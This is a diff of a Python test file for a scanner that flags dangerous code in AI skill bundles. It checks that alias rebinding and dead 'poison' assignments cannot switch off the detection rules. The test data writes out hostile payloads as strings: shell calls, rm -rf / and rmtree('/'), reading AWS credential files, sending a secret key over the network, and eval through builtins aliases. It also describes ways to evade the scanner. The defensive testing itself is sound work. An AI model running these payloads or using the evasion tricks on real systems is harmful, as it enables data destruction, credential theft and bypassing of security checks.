@@ -648,7 +648,12 @@ class TestScanSkillBundleAliasBinding:
             assert scan["safe"] is True, (name, scan["findings"])
 
     def test_builtin_alias_forms_flagged(self, tmp_path):
-        """The three forms a length rule would have dropped — all of them run."""
+        """The alias forms a length rule would have dropped — all of them run.
+
+        The last two pin one assignment-node branch each: `AnnAssign` and recording
+        EVERY target of a multi-target `Assign`. Deleting either branch leaves the rest
+        of the suite green while the payload goes clean, so they need their own cases.
+        """
         from agenticops.skills.security import scan_skill_bundle
 
         for name, src, line in [
@@ -659,6 +664,9 @@ class TestScanSkillBundleAliasBinding:
                            "        return self.eval(s)\n", 5),
             ("dunder-alias", "bi = __builtins__\nbi.eval('1+1')\n", 2),
             ("module-alias", "import builtins\nalias = builtins\nalias.eval('1+1')\n", 3),
+            ("annotated-alias", "bi: object = __builtins__\nbi.eval('1+1')\n", 2),
+            ("multi-target-alias",
+             "import builtins\nx = y = builtins\ny.eval('1+1')\n", 3),
         ]:
             d = _pkg(tmp_path, name, {"x.py": src})
             scan = scan_skill_bundle(d)
@@ -694,13 +702,98 @@ class TestScanSkillBundleAliasBinding:
                    for f in scan["findings"]), scan["findings"]
 
     def test_rebound_alias_is_dropped(self, tmp_path):
-        """Single assignment only, same discipline as the constant pass."""
+        """Single assignment only, same discipline as the constant pass.
+
+        Both orders, deliberately: with the DANGEROUS write last, plain last-write-wins
+        would flag, so this direction is what actually pins "ambiguous → dropped" rather
+        than passing by accident. Dropping is fail-OPEN and documented — it is the
+        ambiguous-rebinding member of the residual class in KNOWN LIMITATIONS.
+        """
         from agenticops.skills.security import scan_skill_bundle
 
-        d = _pkg(tmp_path, "rebound-alias", {
-            "x.py": "import builtins\nhandle = builtins\nhandle = object()\nhandle.eval('1+1')\n",
-        })
-        assert scan_skill_bundle(d)["safe"] is True, scan_skill_bundle(d)["findings"]
+        for name, src in [
+            ("rebound-alias-innocent-last",
+             "import builtins\nhandle = builtins\nhandle = object()\nhandle.eval('1+1')\n"),
+            ("rebound-alias-dangerous-last",
+             "import builtins\nhandle = object()\nhandle = builtins\nhandle.eval('1+1')\n"),
+        ]:
+            d = _pkg(tmp_path, name, {"x.py": src})
+            scan = scan_skill_bundle(d)
+            assert scan["safe"] is True, (name, scan["findings"])
+
+    def test_dead_alias_assignment_cannot_disarm_other_rules(self, tmp_path):
+        """An assignment must never REMOVE a binding another rule depends on.
+
+        The alias map's keys are module-wide dotted names, so merging it into the shared
+        import `bindings` let ONE never-executed assignment (`os = __builtins__` in an
+        uncalled function) overwrite the `os` import and silently turn off every rule
+        that resolves through it — os.system/os.popen, subprocess, shutil.rmtree, the
+        `~/.aws/credentials` fold, the network-capability check that arms the
+        secret-material rule, and even the dynamic-exec rule itself. Every payload below
+        flags without its poison line, and must still flag for the SAME reason with it —
+        comparing reasons, not just `safe`, so the pair cannot pass on some unrelated
+        finding the poison line happens to raise. Regression pin for fix round 4:
+        reintroducing `bindings.update(_py_alias_bindings(...))` fails this test.
+        """
+        from agenticops.skills.security import scan_skill_bundle
+
+        dead = "\n\ndef _unused():\n    {stmt}\n    return 0\n"
+        for name, payload, stmt in [
+            ("poison-os-system", "import os\nos.system('id')\n", "os = __builtins__"),
+            ("poison-os-popen", "import os\nos.popen('id').read()\n", "os = builtins"),
+            ("poison-subprocess-shell",
+             "import subprocess\nsubprocess.run('id', shell=True)\n",
+             "subprocess = __builtins__"),
+            ("poison-subprocess-argv",
+             "import subprocess\nsubprocess.run(['rm', '-rf', '/'])\n",
+             "subprocess = __builtins__"),
+            ("poison-rmtree", "import shutil\nshutil.rmtree('/')\n", "shutil = __builtins__"),
+            ("poison-secret-material",
+             "import requests\nrequests.get('https://example.invalid',\n"
+             "             params={'k': 'AWS_SECRET_ACCESS_KEY'})\n",
+             "requests = __builtins__"),
+            # The re-review's SUP-10: the round's own headline rule, disarmed by rebinding
+            # the `eval` key itself. Only the NON-alias resolution reaches this one.
+            ("poison-bare-eval", "print(eval('1+1'))\n", "eval = __builtins__"),
+            # The re-review's PATH-2, and the one to lead with: the credential-file rule
+            # stops firing because ('__builtins__','path','join') is not a join call, so
+            # the fold returns None.
+            ("poison-credential-fold",
+             "import os\nopen(os.path.join(os.path.expanduser('~'), '.aws', 'credentials'))\n",
+             "os = __builtins__"),
+        ]:
+            control = _pkg(tmp_path, name + "-control", {"x.py": payload})
+            clean = scan_skill_bundle(control)
+            assert clean["safe"] is False, name
+            expected = {f["reason"] for f in clean["findings"]}
+            poisoned = _pkg(tmp_path, name, {"x.py": payload + dead.format(stmt=stmt)})
+            scan = scan_skill_bundle(poisoned)
+            assert scan["safe"] is False, (name, stmt, scan["findings"])
+            assert expected <= {f["reason"] for f in scan["findings"]}, \
+                (name, stmt, sorted(expected), scan["findings"])
+
+    def test_dead_alias_poison_shapes_cannot_disarm(self, tmp_path):
+        """The poison line needs no obfuscation primitive, so pin its cheap shapes.
+
+        A dead module-level branch, an `AnnAssign`, a class body, and any dynamic-exec
+        spelling as the value all bind the same key; a comprehension target is killed as
+        ambiguous. None of them may suppress the os.system finding.
+        """
+        from agenticops.skills.security import scan_skill_bundle
+
+        payload = "import os\nos.system('id')\n"
+        for name, poison in [
+            ("dead-branch", "if False:\n    os = __builtins__\n"),
+            ("value-is-eval", "def _unused():\n    os = eval\n"),
+            ("annotated", "def _unused():\n    os: object = __builtins__\n"),
+            ("class-body", "class _C:\n    os = __builtins__\n"),
+            ("comprehension", "_ = [os for os in (__builtins__,)]\n"),
+        ]:
+            d = _pkg(tmp_path, "poison-shape-" + name, {"x.py": payload + poison})
+            scan = scan_skill_bundle(d)
+            assert scan["safe"] is False, (name, scan["findings"])
+            assert any("shell escape" in f["reason"] for f in scan["findings"]), \
+                (name, scan["findings"])
 
     def test_attribute_pair_spelling_os_system_stays_flagged(self, tmp_path):
         """Ruled ACCEPTED false positive, pinned so it is never silently suppressed.
